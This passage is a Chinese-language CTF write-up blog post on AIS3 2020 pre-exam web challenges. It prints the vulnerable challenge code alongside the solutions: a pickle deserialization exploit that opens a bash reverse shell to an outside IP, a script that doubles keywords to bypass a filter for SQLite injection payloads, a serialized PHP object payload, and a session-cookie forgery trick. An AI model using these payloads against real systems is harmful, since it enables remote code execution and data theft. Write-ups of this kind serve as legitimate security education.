+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:1:&quot;a&quot;;s:11:&quot;\x00User\x00token&quot;;a:0:&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;0nly_3l3ph4n75_5h0uld_0wn_1v0ry&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Snake"><a class="header-anchor" href="#Snake"></a>Snake</h3>
+<p>這題網站在 <a href="https://snake.ais3.org/">https://snake.ais3.org/</a> ，首頁就是原始碼了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"><span class="keyword">import</span> pickle, base64, traceback</span><br><span class="line"></span><br><span class="line">Response.default_mimetype = <span class="string">'text/plain'</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.values.get(<span class="string">'data'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = base64.b64decode(data)</span><br><span class="line">            data = pickle.loads(data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">and</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> open(<span class="string">'/flag'</span>).read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> str(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> traceback.format_exc()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br></pre></td></tr></table></figure>
+<p>給他 data，他會 <code>pickle.loads</code>，沒有任何檢查，所以直接 reverse shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Exploit</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span>(os.system, ((<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/1.2.3.4/9999 0&gt;&amp;1"'</span>),))</span><br><span class="line"></span><br><span class="line">ex = Exploit()</span><br><span class="line">print(b64decode(pickle.dumps(ex)))</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Owl"><a class="header-anchor" href="#Owl"></a>Owl</h3>
+<p>這題網站在 <a href="https://turtowl.ais3.org/%EF%BC%8C%E9%A6%96%E9%A0%81%E6%9C%89%E7%99%BB%E5%85%A5%E9%A0%81%E9%9D%A2%EF%BC%8C%E4%BB%96%E6%9C%89%E5%80%8B%E7%99%BD%E8%89%B2%E5%AD%97%E5%AF%AB">https://turtowl.ais3.org/，首頁有登入頁面，他有個白色字寫</a> <code>GUESS THE STUPID USERNAME / PASSWORD</code>，猜 <code>admin/admin</code> 就登進去了，登進去後，又有個白色字按鈕寫 <code>SHOW HINT</code>，點下去就看到原始碼了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Settings</span></span><br><span class="line">    ini_set(<span class="string">'display_errors'</span>, <span class="number">1</span>);</span><br><span class="line">    ini_set(<span class="string">'display_startup_errors'</span>, <span class="number">1</span>);</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    date_default_timezone_set(<span class="string">'Asia/Taipei'</span>);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CSRF</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'csrf_key'</span>]))</span><br><span class="line">        $_SESSION[<span class="string">'csrf_key'</span>] = md5(rand() * rand());</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">'csrf.php'</span>);</span><br><span class="line">    $csrf = <span class="keyword">new</span> Csrf($_SESSION[<span class="string">'csrf_key'</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($action = @$_GET[<span class="string">'action'</span>]) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">redirect</span><span class="params">($path = <span class="string">'/'</span>, $message = null)</span> </span>&#123;</span><br><span class="line">            $alert = $message ? <span class="string">'alert('</span> . json_encode($message) . <span class="string">')'</span> : <span class="string">''</span>;</span><br><span class="line">            $path = json_encode($path);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"&lt;script&gt;$alert; document.location.replace($path);&lt;/script&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($action === <span class="string">'logout'</span>) &#123;</span><br><span class="line">            <span class="keyword">unset</span>($_SESSION[<span class="string">'user'</span>]);</span><br><span class="line">            redirect(<span class="string">'/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ($action === <span class="string">'login'</span>) &#123;</span><br><span class="line">            <span class="comment">// Validate CSRF token</span></span><br><span class="line">            $token = @$_POST[<span class="string">'csrf_token'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!$token || !$csrf-&gt;validate($token)) &#123;</span><br><span class="line">                redirect(<span class="string">'/'</span>, <span class="string">'invalid csrf_token'</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if username and password are given</span></span><br><span class="line">            $username = @$_POST[<span class="string">'username'</span>];</span><br><span class="line">            $password = @$_POST[<span class="string">'password'</span>];</span><br><span class="line">            <span class="keyword">if</span> (!$username || !$password) &#123;</span><br><span class="line">                redirect(<span class="string">'/'</span>, <span class="string">'username and password should not be empty'</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of sqlmap kiddies</span></span><br><span class="line">            <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>], <span class="string">'sqlmap'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">                redirect(<span class="string">'/'</span>, <span class="string">"sqlmap is child's play"</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of you</span></span><br><span class="line">            $bad = [<span class="string">' '</span>, <span class="string">'/*'</span>, <span class="string">'*/'</span>, <span class="string">'select'</span>, <span class="string">'union'</span>, <span class="string">'or'</span>, <span class="string">'and'</span>, <span class="string">'where'</span>, <span class="string">'from'</span>, <span class="string">'--'</span>];</span><br><span class="line">            $username = str_ireplace($bad, <span class="string">''</span>, $username);</span><br><span class="line">            $username = str_ireplace($bad, <span class="string">''</span>, $username);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Auth</span></span><br><span class="line">            $hash = md5($password);</span><br><span class="line">            $row = (<span class="keyword">new</span> SQLite3(<span class="string">'/db.sqlite3'</span>))</span><br><span class="line">                -&gt;querySingle(<span class="string">"SELECT * FROM users WHERE username = '$username' AND password = '$hash'"</span>, <span class="keyword">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (!$row) &#123;</span><br><span class="line">                redirect(<span class="string">'/'</span>, <span class="string">'login failed'</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_SESSION[<span class="string">'user'</span>] = $row[<span class="string">'username'</span>];</span><br><span class="line">            redirect(<span class="string">'/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            redirect(<span class="string">'/'</span>, <span class="string">"unknown action: $action"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $user = @$_SESSION[<span class="string">'user'</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;🦉🦉🦉🦉&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">'utf-8'</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span> id=<span class="string">"bootstrap-css"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">if</span> (!$user): <span class="meta">?&gt;</span></span><br><span class="line">        &lt;div id=<span class="string">"login"</span>&gt;</span><br><span class="line">            &lt;h3 class="text-center text-white pt-5"&gt;GUESS THE STUPID USERNAME / PASSWORD&lt;/h3&gt;</span><br><span class="line">            &lt;div class="container"&gt;</span><br><span class="line">                &lt;div id="login-row" class="row justify-content-center align-items-center"&gt;</span><br><span class="line">                    &lt;div id="login-column" class="col-md-6"&gt;</span><br><span class="line">                        &lt;div id="login-box" class="col-md-12"&gt;</span><br><span class="line">                            &lt;form id="login-form" class="form" action="?action=login" method="post"&gt;</span><br><span class="line">                                &lt;input type=<span class="string">"hidden"</span> name=<span class="string">"csrf_token"</span> value=<span class="string">"&lt;?= htmlentities($csrf-&gt;generate()) ?&gt;"</span>&gt;</span><br><span class="line">                                &lt;h3 class="text-center text-info"&gt;🦉: "Login to see cool things!"&lt;/h3&gt;</span><br><span class="line">                                &lt;div class="form-group"&gt;</span><br><span class="line">                                    &lt;label for="name" class="text-info"&gt;Username:&lt;/label&gt;&lt;br&gt;</span><br><span class="line">                                    &lt;input type="text" name="username" id="username" class="form-control"&gt;&lt;br&gt;</span><br><span class="line">                                    &lt;label for="name" class="text-info"&gt;Password:&lt;/label&gt;&lt;br&gt;</span><br><span class="line">                                    &lt;input type="text" name="password" id="password" class="form-control"&gt;&lt;br&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                                &lt;div class="form-group"&gt;</span><br><span class="line">                                    &lt;input type="submit" name="submit" class="btn btn-info btn-md" value="Login"&gt;</span><br><span class="line">                                &lt;/div&gt;</span><br><span class="line">                            &lt;/form&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">else</span>: <span class="meta">?&gt;</span></span><br><span class="line">        &lt;h3 class="text-center text-white pt-5"&gt;&lt;a style="color: white" href="/?source"&gt;SHOW HINT&lt;/a&gt;&lt;/h3&gt;</span><br><span class="line">        &lt;div class="container"&gt;</span><br><span class="line">            &lt;div class="row justify-content-center align-items-center"&gt;</span><br><span class="line">                &lt;div class="col-md-6"&gt;</span><br><span class="line">                    &lt;div class="col-md-12"&gt;</span><br><span class="line">                        &lt;h3 class="text-center text-info"&gt;Nothing&lt;/h3&gt;</span><br><span class="line">                        Hello, &lt;b&gt;<span class="meta">&lt;?</span>= htmlentities($user) <span class="meta">?&gt;</span>&lt;/b&gt;, nothing here.</span><br><span class="line">                        &lt;a href=<span class="string">"?action=logout"</span>&gt;Logout!&lt;/a&gt;</span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span> <span class="keyword">endif</span> <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<p>就是 sqlite 的 SQL Injection，輸入的 username 會用 <code>str_ireplace</code> 過濾兩次，很好繞過，打 <code>///***</code> 就會被過濾成 <code>/*</code>，打 <code>selselselectectect</code> 就會被過濾成 <code>select</code>，所以寫個簡單的 script 自動轉換 payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">table = &#123;</span><br><span class="line">    <span class="string">' '</span>: <span class="string">'/**/'</span>,</span><br><span class="line">    <span class="string">'/*'</span>: <span class="string">'///***'</span>,</span><br><span class="line">    <span class="string">'*/'</span>: <span class="string">'***///'</span>,</span><br><span class="line">    <span class="string">'union'</span>: <span class="string">'unununionionion'</span>,</span><br><span class="line">    <span class="string">'select'</span>: <span class="string">'selselselectectect'</span>,</span><br><span class="line">    <span class="string">'and'</span>: <span class="string">'anananddd'</span>,</span><br><span class="line">    <span class="string">'or'</span>: <span class="string">'ooorrr'</span>,</span><br><span class="line">    <span class="string">'where'</span>: <span class="string">'whewhewhererere'</span>,</span><br><span class="line">    <span class="string">'from'</span>: <span class="string">'frfrfromomom'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">inp = sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> t,v <span class="keyword">in</span> table.items():</span><br><span class="line">    inp = inp.replace(t, v)</span><br><span class="line">print(inp)</span><br></pre></td></tr></table></figure>
+<p>注意到 <code>--</code> 還是沒辦法用，因為 <code>-selselectect-</code> 會被轉成空的，<code>select</code> 順序在 <code>--</code> 前面會先被過濾掉，<code>str_ireplace</code> 是照著 list 一個個 replace 的，不過我們用 <code>/*</code> 就足夠了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;unununionionion&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;selselselectectect&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;null,sql,null&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;frfrfromomom&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;sqlite_master&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;whewhewhererere&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;type&#x3D;&#39;table&#39;&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;limit&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;1&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;offset&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;0&#x2F;&#x2F;&#x2F;***</span><br></pre></td></tr></table></figure>
+<p>先挖 table，找到 <code>CREATE TABLE garbage ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, value TEXT )</code>，只有這個 <code>garbage</code> 和 <code>users</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;unununionionion&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;selselselectectect&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;null,name,null&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;frfrfromomom&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;garbage&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;limit&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;1&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;offset&#x2F;&#x2F;&#x2F;******&#x2F;&#x2F;&#x2F;0&#x2F;&#x2F;&#x2F;***</span><br></pre></td></tr></table></figure>
+<p>再挖 db 裡面，挖到有個 name 是 <code>something good</code>，挖他的 value 就看到 flag 了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;4_ch1ld_15_4_curly_d1mpl3d_lun471c&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Rhino"><a class="header-anchor" href="#Rhino"></a>Rhino</h3>
+<p>這題網站在 <a href="https://rhino.ais3.org/%EF%BC%8C">https://rhino.ais3.org/，</a><code>robots.txt</code> 可以看到東西</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># RIP robots!</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;</span><br><span class="line">Disallow: &#x2F;index.html</span><br><span class="line">Disallow: &#x2F;*.xml</span><br><span class="line">Disallow: &#x2F;recent</span><br><span class="line">Disallow: &#x2F;assets</span><br><span class="line">Disallow: &#x2F;about</span><br><span class="line">Disallow: &#x2F;*.js</span><br><span class="line">Disallow: &#x2F;*.json</span><br><span class="line">Disallow: &#x2F;node_modules</span><br><span class="line">Disallow: &#x2F;flag.txt</span><br></pre></td></tr></table></figure>
+<p>然後這個網站看起來是用 express 架的然後放 jekyll 產的 blog，既然是 js project 先看個 <code>package.json</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;app&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;&quot;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node chill.js&quot;,</span><br><span class="line">    &quot;test&quot;: &quot;echo \&quot;Error: no test specified\&quot; &amp;&amp; exit 1&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;author&quot;: &quot;djosix&quot;,</span><br><span class="line">  &quot;license&quot;: &quot;ISC&quot;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;cookie-session&quot;: &quot;^1.4.0&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;^4.17.1&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然後就看到原始碼叫做 <code>chill.js</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(session(&#123;</span><br><span class="line">  secret: <span class="string">"I'm watching you."</span></span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line">app.use(<span class="string">'/'</span>, express.static(<span class="string">'./'</span>));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/flag.txt'</span>, (req, res) =&gt; &#123;</span><br><span class="line">  res.setHeader(<span class="string">'Content-Type'</span>, <span class="string">'text/plain'</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> n = req.session.magic;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (n &amp;&amp; (n + <span class="number">420</span>) === <span class="number">420</span>)</span><br><span class="line">    res.sendFile(<span class="string">'/flag'</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    res.send(<span class="string">'you are a sad person too'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'*'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">  res.status(<span class="number">404</span>).sendFile(<span class="string">'404.html'</span>, &#123; <span class="attr">root</span>: __dirname &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(process.env.PORT, <span class="string">'0.0.0.0'</span>);</span><br></pre></td></tr></table></figure>
+<p>看起來只要讓他的 <code>n &amp;&amp; (n + 420) === 420</code> 就可以讀 flag 了，以前就很常看到 FB 上有人 po 一些 js 的梗圖說明 js 很古怪的行為，隨便看了幾張複習一下，就想到有浮點數誤差的問題，所以 <code>n</code> 設成 <code>0.00000000000001</code> 就可以了，<code>n</code> 是從 <code>req.session.magic</code> 抓的，所以我們要設 <code>req.session.magic</code> 的話，最簡單的方式就是自己把 server 架起來，然後多加一行 <code>req.session.magic = 0.00000000000001</code>，就可以產出 <code>express:sess</code> 和 <code>express:sess.sig</code> 兩個 Cookie 了，sig 是用前面設定的 <code>secret: &quot;I'm watching you.&quot;</code> 算出來的，詳情可以看 <a href="https://www.npmjs.com/package/cookie-session">cookie-session</a>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AIS3&#123;h4v3_y0u_r34d_7h3_rh1n0_b00k?&#125;</span><br></pre></td></tr></table></figure>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/ctf/" rel="tag">ctf</a>, <a class="has-link-grey -link" href="/tags/security/" rel="tag">security</a>, <a class="has-link-grey -link" href="/tags/writeups/" rel="tag">writeups</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2020/07/31/security/osint/maltego/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">[小工具] Maltego</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2020/05/04/security/writeups/f-hash/">
+                <span class="level-item">[Writeups] VolgaCTF Quals 2020 - F-Hash</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">Comments</h3>
+        
+<script>
+    var disqus_config = function () {
+        this.page.url = 'https://oalieno.github.io/2020/06/09/security/writeups/ais3-2020-preexam/';
+        this.page.identifier = '2020/06/09/security/writeups/ais3-2020-preexam/';
+    };
+    (function() {
+        var d = document, s = d.createElement('script');  
+        s.src = '//' + 'oalieno' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+
+<div id="disqus_thread">
+    
+    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+    </div>
+</div>
+</div>
+                
+
+
+
+
+<div class="column is-3-tablet is-3-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="https://www.gravatar.com/avatar/dd413429dc0e386a4dfdb890e39dd038?s=512" alt="oalieno">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        oalieno
+                    </p>
+                    
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>Taiwan</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
